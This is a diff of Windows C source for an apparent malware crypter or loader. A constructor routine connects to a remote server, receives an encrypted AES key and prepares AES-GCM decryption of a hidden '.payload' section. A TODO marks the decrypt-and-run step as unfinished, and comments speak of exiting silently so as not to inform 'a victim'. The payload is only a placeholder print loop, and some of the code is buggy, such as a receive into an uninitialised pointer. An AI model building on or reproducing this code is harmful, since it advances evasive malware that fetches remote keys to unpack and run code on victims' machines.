@@ -91,6 +91,15 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	WSADATA  wsaData;
 	struct addrinfo *result = NULL, init = {0};
 	/*
+	 * 
+	 */
+	BYTE* key;
+	/*
+	 * Define variables required to decrypt the payload stub
+	 */
+	BCRYPT_ALG_HANDLE decryptPayloadKeyAlg;
+	BCRYPT_KEY_HANDLE decryptPayloadKey;
+	/*
 	* retrieving the public key
 	* in the event of an error silently exit 0. No reason to provide a return status to a victim
 	*/
@@ -141,7 +150,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	}
     	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(OTP), AESKEYLEN, 0)))
     	{
-		printf("error generating random number");
+	printf("error generating random number");
 		exit(0);
     	}
 	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
@@ -223,26 +232,50 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * recieve the OTP encrypted AES key from the server
 	 */
-	recvData = realloc(recvData,AESKEYLEN+1);
-	if(!recv(Connection,recvData,AESKEYLEN,0))
+	recvData = malloc(AESKEYLEN+1);
+	if(!recv(Connection,key,AESKEYLEN,0))
 	{
 		exit(-1);
 	} 
 	
 	for( int x = 0 ; x<AESKEYLEN ; x++)
 	{
-		printf("0x%x ", *(recvData+x) ^ *(OTP+x));
+		 *(recvData+x) ^= *(OTP+x);
 	}
 
 			
 	/*
 	 * Decode The IV
 	 */
-	    if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
-		exit(0); /*
+	 if (!CryptStringToBinaryA(iv,IVENCLEN,CRYPT_STRING_BASE64, decodedIV,&sz,NULL,NULL))
+		exit(0);
+	/*
 			  * silently exit, even though we exit with error we don't
 			  * give this information to the OS
 			  */
+	/*
+	 * open the handle to the cryptograpic primitive required to decrypt the payload
+	 */
+	if(BCryptOpenAlgorithmProvider( &decryptPayloadKeyAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
+	{
+		printf ("failed to open the algorithm provider for payload decryption");
+		exit (-1);
+	}
+	/*
+	 * Set the mode for decryption to GCM, the GCM provider works for both pycryptodome and 
+	 * the microsft bcrypt C cryptographic provider. 
+	 */
+	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0) != STATUS_SUCCESS)
+	{
+		printf ("failed to set the chaining mode to OFB");
+		exit(-1);
+	}
+	if(BCryptGenerateSymmetricKey(decryptPayloadKeyAlg,&decryptPayloadKey, 0,0,(PUCHAR)key,AESKEYLEN,0) != STATUS_SUCCESS)
+	{
+		printf("failed to create a BCryptKeyHandle");
+		exit(-1);
+	}
+	//if(BCryptDeriveKey
 	/** TODO
 	 *  DECYPT PAYLOAD
 	 *  RUN PAYLOAD
@@ -267,10 +300,11 @@ __attribute__((destructor(101),section(".cryptor"))) int destruct(){
 	return 0;
 }
 
+
 __attribute__((section(".payload"))) void payolad(){
-
-printf("here");
-
+	for (int x = 0; x < 21; x++){
+		printf("here");
+	}
 }
 
 int main()
